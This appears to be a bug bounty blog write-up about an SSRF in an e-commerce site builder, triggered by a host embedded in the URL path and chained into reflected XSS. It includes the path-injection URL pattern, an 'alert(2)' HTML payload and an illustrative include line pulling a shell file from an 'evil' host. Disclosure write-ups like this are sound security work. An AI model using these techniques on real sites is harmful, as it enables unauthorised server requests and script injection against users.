---
title: "I Came for RFI, I Left with SSRF + XSS"
date: 2026-06-17
categories: [Bug Bounty, Web Security]
tags: [ssrf, xss, recon, bug-bounty, ssr]
description: "A messy little bug where a URL inside a URL made the server phone a stranger, then reflect whatever it said straight into the page."
---

Hi guys 

Today we're poking at a weird, slightly messy bug. The kind that won't sit still in one box and keeps changing its mind about what it is. Grab a coffee.

## Stop staring at parameters

When most people open a target, they go straight for the parameters: `?id=`, `?file=`, `?redirect=`, the usual suspects. And sure, plenty of bugs live there. But here's something I keep relearning: sometimes the juicy part isn't a parameter at all. It's the URL itself. The **path**.

Over the years I've pulled SQLi, LFI, RFI, and SSTI out of plain URL paths that everyone else walked right past. So now the path gets the exact same suspicion a parameter would.

This one is about an SSRF that cosplays as RFI. The target is a "build-your-own-marketplace" platform (think Shopify's cousin) powering well over a million live sites. So, a decent place to go digging.

## Step 1: throw Collaborator at it

First move whenever I test a URL: Burp Collaborator. It's just comfy. Drop a Collaborator URL in, watch what pings back.

So I tried this:

```
https://TARGET/assets/xxxx/xxxx/https://<your-collab>/
```

And... the Collaborator content showed up *on the target page*, and the site threw a clean **500**.

![Collaborator content reflected on the target plus a 500](/assets/img/posts/collab-reflect.png)
_Our Collaborator content, rendered right on the target. Plus a 500 for flavor._

My brain immediately went: *"Ohh, RFI. The server is pulling my remote file in. Easy."*

> Spoiler: my brain was wrong. Hold that thought.


## Step 2: the plot stops making sense

Naturally I pointed it at my own server next, expecting fireworks.

Nothing. Status **200**, no reflection, no drama. Tried different file types, same boring 200. Ran through a pile of bypass tricks, still nothing.

That's when it clicked: the problem wasn't *my bypass*. It was that I had no idea what the server was actually doing yet.

So I went back to Collaborator and actually *read* the incoming requests. And there it was:

```
GET /api/v1/xxx/xxx
```

The server wasn't hitting my root. It was appending **its own** path and requesting `/api/v1/xxx/xxx` on whatever host I handed it.

![Collaborator request log showing the server fetching /api/v1/xxx/xxx](/assets/img/posts/collab-request.png)
_The server politely asking my box for /api/v1/xxx/xxx_

So the deal is: the app takes the host from the path, tacks on its own API route, fetches it server-side, and if that endpoint answers, it tries to do something with the response. It wants **JSON** back, some kind of config blob.

> This right here is the SSRF: the server is making a request to a host *I* control. The reflection is a bonus on top.

## Step 3: boom

Fine. Let's give it what it's looking for. Sort of. I created `/api/v1/xxx/xxx` on my own server and dropped a tiny bit of HTML in it:

```html
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>BBBB</title>
</head>
<body>
<script>alert(2)</script>
</body>
</html>
```

And **boom**, same 500, and my content rendered on the target again. Alert popped. We've got XSS.

![alert(2) firing on the target origin](/assets/img/posts/xss-pop.png)
_Hello from your own origin._

Then I got greedy and tried to mimic the actual JSON the endpoint expected, hoping for a cleaner render. That went absolutely nowhere. No matter how nicely I shaped the JSON, it refused to play along.

## Step 4: the RCE daydream (and the cold shower)

For about thirty seconds I let myself dream. Server fetches my content, content runs, surely this is RCE? Time to update the CV.

Nope. Two things killed the fantasy:

1. The content I was seeing came out of an **error path**: the 500. The server choked trying to treat my HTML as its config object, and the error response reflected my raw content.
2. The actual rendering and execution is **client-side**. The `<script>` only ever runs in the *browser*, never in the server's process.

Here's the tell: `alert()` is a browser thing. If my payload were running on the server (Node), `alert` wouldn't even exist; it'd throw, not pop. So the popup itself is proof execution is client-side. No server code execution, no RCE. Just a very real XSS riding on top of an SSRF.

> PSA: don't oversell this as RCE. "Content runs" is not "runs on the server." Mislabeling it is the fastest road to closed-as-not-applicable.

## RFI or SSRF? (the question everyone asks)

Since I called it RFI at the start, let's settle it. **It's SSRF, not RFI.**

RFI means the server *includes and executes* a remote file as code in its own context, classic `include("http://evil/shell.txt")` energy. That is not what happens here. The server just makes an HTTP request to my host (SSRF) and reflects the response into the page (XSS). Nothing of mine runs server-side. "It pulled a file in" *feels* like RFI, but the actual test for RFI is server-side code execution of that file, and we don't have it.

## TL;DR

- Look at the **path**, not just parameters. Bugs hide there.
- A URL-in-URL made the server fetch an attacker host → **SSRF**.
- The server appended its own `/api/v1/...` route and reflected the response → **reflected XSS** (client-side).
- No RCE. Execution is in the browser, and the reflection comes from an error path.
- `alert()` popping = client-side. Tattoo that on the inside of your eyelids before you write "RCE" anywhere.

That's the messy one. Sometimes a bug doesn't want to be just one thing, and figuring out *which* thing it actually is is half the fun.

Catch you in the next one.

Stay sharp,
cyb3rlynx
